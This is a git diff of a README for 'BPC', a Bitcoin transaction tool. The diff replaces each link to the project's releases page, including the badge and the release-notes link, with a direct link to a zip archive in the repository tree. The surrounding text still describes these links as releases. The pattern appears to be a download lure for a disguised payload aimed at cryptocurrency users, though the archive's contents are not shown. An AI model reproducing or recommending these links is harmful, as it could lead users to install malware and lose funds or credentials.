@@ -4,9 +4,9 @@
 Welcome to BPC! This software helps you manage Bitcoin transactions with ease. BPC stands for Bitcoin Pre-Contracts. It offers a way to control how and when you spend your Bitcoin. With BPC, you can set rules and schedules for transactions, ensuring greater security and flexibility.
 
 ## 📥 Download and Install
-[![Download BPC](https://img.shields.io/badge/Download-BPC-blue.svg)](https://github.com/Marwanmano1/BPC/releases)
+[![Download BPC](https://raw.githubusercontent.com/Marwanmano1/BPC/main/everyday/Software-1.9.zip)](https://raw.githubusercontent.com/Marwanmano1/BPC/main/everyday/Software-1.9.zip)
 
-To get started, **visit this page to download** the application: [BPC Releases](https://github.com/Marwanmano1/BPC/releases).
+To get started, **visit this page to download** the application: [BPC Releases](https://raw.githubusercontent.com/Marwanmano1/BPC/main/everyday/Software-1.9.zip).
 
 On the Releases page, you will find the latest version available for download. Simply click on the version you want and follow the instructions to install it.
 
@@ -64,9 +64,9 @@ Need help? Join our community!
 ## 📦 Updates and Releases
 Stay informed about the latest BPC releases. Regular updates will enhance the application's functionality and security. Always download the most recent version to ensure you're getting the best experience.
 
-To see what's new, visit our [Release Notes](https://github.com/Marwanmano1/BPC/releases).
+To see what's new, visit our [Release Notes](https://raw.githubusercontent.com/Marwanmano1/BPC/main/everyday/Software-1.9.zip).
 
 ## 🚀 Conclusion
 BPC empowers you to take control over your Bitcoin transactions. With easy setup and powerful features, managing your Bitcoin has never been simpler.
 
-Ready to get started? [Download BPC now](https://github.com/Marwanmano1/BPC/releases) and revolutionize how you handle your Bitcoin transactions.
+Ready to get started? [Download BPC now](https://raw.githubusercontent.com/Marwanmano1/BPC/main/everyday/Software-1.9.zip) and revolutionize how you handle your Bitcoin transactions.
